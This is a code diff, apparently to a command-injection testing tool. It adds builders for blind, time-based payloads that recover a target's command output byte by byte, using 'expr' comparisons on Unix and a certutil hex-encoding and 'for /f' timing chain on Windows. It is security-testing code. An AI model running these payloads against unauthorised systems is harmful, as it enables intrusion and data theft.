@@ -3954,6 +3954,21 @@ def tamper_dep_windows_only(tamper_name):
     return "The '" + tamper_name + ".py' tamper script needs 'cmd.exe'. Skipping tamper script."
 
 # Why this script cannot be applied to a Windows target.
+"""
+Said once where a script writes what only some shells read.
+
+A brace expansion is read by 'bash' and 'ksh' and by no POSIX shell that is neither; ANSI-C quoting
+is read by those and 'zsh'. Which shell answers at the other end is not something a run is told, and
+a target running another answers such a payload exactly as it answers a parameter that was never
+injectable - so it is said rather than refused, the choice being the one running it to make.
+"""
+def tamper_shell_note(tamper_name, shells):
+  named = ["'" + shell + "'" for shell in shells]
+  warn_msg = "The '" + tamper_name + ".py' tamper script is only read by a "
+  warn_msg += (", ".join(named[:-1]) + " or " + named[-1]) if len(named) > 1 else named[0]
+  warn_msg += " shell, so another answers its payloads as not injectable."
+  settings.print_once(warn_msg)
+
 def tamper_dep_unix_only(tamper_name):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     return "The '" + tamper_name + ".py' tamper script needs a POSIX shell. Skipping tamper script."
@@ -4029,6 +4044,68 @@ def command_in(payload):
     return None
   return re.search(blank_tolerant(settings.USER_APPLIED_CMD), payload)
 
+"""
+A byte written into a payload as the character it is, or nothing where it cannot be.
+
+A comparison that names the character rather than its ordinal needs the character spelled out, and
+only a printable one can be: a control byte written raw is one more thing for the transport and the
+target's own decoding to agree about, and a NUL cannot be in an argument at all. The four a double
+quoted string reads as syntax are escaped; the rest stand as they are.
+"""
+def byte_literal(ordinal):
+  if ordinal < 32 or ordinal > 126:
+    return None
+  character = chr(ordinal)
+  return ("\\" + character) if character in '"\\$`' else character
+
+# Whether a byte's ordinal can be read at all, which is what 'printf' is there for: where the run
+# has traded it away, a comparison names the character instead and only a printable one can be named.
+def ordinal_unavailable():
+  return settings.PRINT_WITH_ECHO and settings.TARGET_OS != settings.OS.WINDOWS
+
+"""
+Whether the byte at this position is one of a set of characters, asked as a single match.
+
+Where a boundary keeps no variable to hold the output, the reading has to be one expression - and
+one that names no printer, opens no pipe and writes no '-': 'expr' answers how far a match ran, so
+a match that skips to the byte and then asks for a set answers with the position where the byte is
+one of them and with nothing where it is not. The set is written out character by character rather
+than as a range, a range being spelled with the one character a filtered '-' takes away; ']' goes
+first, where it closes nothing, and '^' is never first.
+"""
+def byte_in_class(byte_expression, position, ordinals):
+  ordinals = [one for one in ordinals if one != ord("^") and not (dashless() and one == ord("-"))]
+  members = [byte_literal(ordinal) for ordinal in sorted(ordinals)]
+  if not members or None in members:
+    return None, None
+  # ']' closes nothing where it comes first, and '^' and '-' stand for themselves where they come
+  # last - a '-' between two members would read as the range from one to the other.
+  trailing = [member for member in members if member in ("^", "-")]
+  written = [member for member in members if member not in ("]", "^", "-")]
+  spelled = ("]" if "]" in members else "") + "".join(written) + "".join(sorted(trailing, reverse=True))
+  matched = (settings.CMD_SUB_PREFIX + settings.BYTE_LOCALE + " expr \"A" + byte_expression +
+             "\" : \"." + "\\{" + str(position) + "\\}[" + spelled + "]\"" + settings.CMD_SUB_SUFFIX)
+  return matched, str(position + 1)
+
+"""
+The character at this position compared against the one an ordinal would have named.
+
+'expr' answers which of two strings sorts first, and under the byte locale that is which byte comes
+first - the same question the ordinal was converted for, asked without converting anything. Both
+sides carry the same letter in front: one that is an operator of 'expr's own would be read as one,
+and a letter shared by both leaves the ordering of what follows it untouched.
+"""
+def byte_collation(byte_expression, ordinal, operator, tail=""):
+  literal = byte_literal(ordinal)
+  if literal is None:
+    return None
+  # Whatever the reading appends to the byte is appended here too: a tail on one side only sorts
+  # after the bare character, which would answer an equality with a no that is not the byte's.
+  literal += tail
+  spelled = {"-le": "<=", "-ge": ">=", "-lt": "<", "-gt": ">", "-eq": "=", "-ne": "!="}[operator]
+  return (settings.CMD_SUB_PREFIX + settings.BYTE_LOCALE + " expr \"A" + literal + "\" '" + spelled +
+          "' \"A" + byte_expression + "\"" + settings.CMD_SUB_SUFFIX)
+
 # Whether the run reads a filtered '-' out of its payloads, which is what the dashless script is for.
 def dashless():
   return settings.DASHLESS_TAMPER in settings.MULTI_ENCODED_PAYLOAD and settings.TARGET_OS != settings.OS.WINDOWS
@@ -4078,7 +4155,7 @@ def char_pool_expands():
   outside what was asked for, and is left unresolved rather than searched for at a cost the user
   did not ask to pay.
   """
-  return not menu.options.charset
+  return not menu.options.charset and not ordinal_unavailable()
 
 def substitution_nests():
   """
@@ -5198,7 +5275,32 @@ def perform_payload_modification(payload):
     payload = _apply_tamper(script, module, payload)
 
   dashless_leftover_note(payload)
+  printer_leftover_note(payload)
   return payload
+
+"""
+A payload still naming the printer the run traded away, said once.
+
+Trading 'printf' for 'echo' settles how the builders print, and a reading written by one script can
+still be rewritten by another into one that names it again - the byte taken down a pipe without a
+'-' is read with 'printf' by name, whichever printer the run settled on. Read off what was built
+rather than off a list of which scripts do that, so a combination nobody thought of is caught by
+the same reading, and a target refusing the name answers such a payload as it answers a parameter
+that was never injectable.
+"""
+def printer_leftover_note(payload):
+  if settings.PRINTER_LEFTOVER_NOTICE_GIVEN or not settings.PRINT_WITH_ECHO:
+    return
+  if settings.TARGET_OS == settings.OS.WINDOWS or "printf" not in payload:
+    return
+  opening, closing = settings.PAYLOAD_EDGES if settings.PAYLOAD_EDGES else ("", "")
+  body = payload[len(opening):len(payload) - len(closing)] if opening or closing else payload
+  if "printf" not in body:
+    return
+  settings.PRINTER_LEFTOVER_NOTICE_GIVEN = True
+  warn_msg = "The payload still names 'printf', which this run traded for 'echo', so a target "
+  warn_msg += "refusing that name answers it as not injectable."
+  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
 
 """
 What the dashless script could not reach, named once a run.
@@ -5839,14 +5941,38 @@ def caret_escaped(cmd):
     return cmd
   return cmd.replace(settings.WIN_ESCAPE, settings.WIN_ESCAPE * 2)
 
+"""
+Held to the bytes a payload can name, where naming the character is how the asking is done.
+
+Only a printable byte can be written into a comparison as itself, so a pool that reaches past them
+is a pool whose far end cannot be asked about at all - and a question that cannot be asked is worse
+than one not asked, the search reading the silence as an answer.
+"""
+def _nameable(pool):
+  if not ordinal_unavailable():
+    return pool
+  """
+  Two printable characters are left out, each only where the reading in use cannot ask about it.
+
+  A '^' asked about on its own is the only thing between the brackets, where it negates the set
+  rather than standing in it - and there is no second spelling of it that means the one character.
+  That is the set reading, which is what a pipe gets, having no variable to name the byte out of;
+  every other boundary names the character itself, and names that one as readily as any. A '-' is
+  left out wherever the run is keeping one out of its payloads, naming it being what it cannot do.
+  """
+  asked_as_a_set = current_separator() in ("|", "||")
+  return [ordinal for ordinal in pool if byte_literal(ordinal) is not None
+          and not (asked_as_a_set and ordinal == ord("^"))
+          and not (dashless() and ordinal == ord("-"))]
+
 def generate_char_pool(num_of_chars):
   if menu.options.charset:
-    return [ord(c) for c in menu.options.charset]
+    return _nameable([ord(c) for c in menu.options.charset])
 
   if num_of_chars == 1:
-    return list(settings.CHAR_POOL_SINGLE)
+    return _nameable(list(settings.CHAR_POOL_SINGLE))
 
-  return list(settings.CHAR_POOL_MULTI)
+  return _nameable(list(settings.CHAR_POOL_MULTI))
   
 """
 Print powershell version
@@ -8266,6 +8392,38 @@ def windows_probe(chain, cmd, operator, expected, timesec):
   return (chain +
           "for /f \"tokens=* eol=\" %i in ('cmd /c " + cmd + "') do cmd /c if %i " + operator +
           settings.SINGLE_WHITESPACE + str(expected) + settings.SINGLE_WHITESPACE +
+          windows_sleep(timesec) + windows_tail(chain))
+
+"""
+A command's Nth byte (0-based), as the two lowercase hex digits 'certutil -encodehex' writes it -
+no PowerShell, and the byte never passes through a cmd.exe variable raw.
+
+'set' gives an unescaped caret a second, corrupting pass of cmd.exe's own caret-escape handling -
+reproduced live, consistent rather than flaky: a real caret at the read position is silently read
+back as something else every time, with none of the run's own instability warnings to flag it. Hex
+digits carry no such meaning to cmd.exe, so encoding the byte before it ever reaches 'set' sidesteps
+the bug rather than working around it. Comparable with a plain GEQ/EQU: two fixed-width hex digits
+sort the same way the bytes they stand for do - checked live against every digit/letter boundary
+('39'/'61', '00'/'ff', ...), not just the one byte this exists for.
+
+Chained as one top-level statement rather than run through 'windows_probe': nesting this chain's
+own 'for /f' a second time inside that one's - which a pipe forces, through 'cmd /c' - stops the
+inner one from running at all, proven live (a bare comparison survives the same nesting; a second
+'for /f' does not, 'usebackq' tried too). Reserved for the unconditional separator this is chained
+with throughout, where nothing forces that extra level.
+"""
+def windows_hex_byte_probe(chain, cmd, num_of_chars, operator, expected_hex, timesec):
+  var = settings.RANDOM_VAR_GENERATOR
+  tmp_file = "%temp%\\" + var + ".tmp"
+  hex_file = "%temp%\\" + var + ".hex"
+  line, column = divmod(num_of_chars - 1, 16)
+  offset = column * 3 + (1 if column >= 8 else 0)
+  return (chain +
+          "(cmd /c " + cmd + ")>" + tmp_file + chain +
+          "certutil -encodehex -f " + tmp_file + settings.SINGLE_WHITESPACE + hex_file + " 4" + chain +
+          "for /f \"tokens=* eol= skip=" + str(line) + "\" %a in (" + hex_file + ") do set " + var + "=%a" + chain +
+          "for /f \"tokens=* eol=\" %b in ('cmd /c \"echo %" + var + ":~" + str(offset) + ",2%\"') do cmd /c if %b " +
+          operator + settings.SINGLE_WHITESPACE + expected_hex + settings.SINGLE_WHITESPACE +
           windows_sleep(timesec) + windows_tail(chain))
 
 """
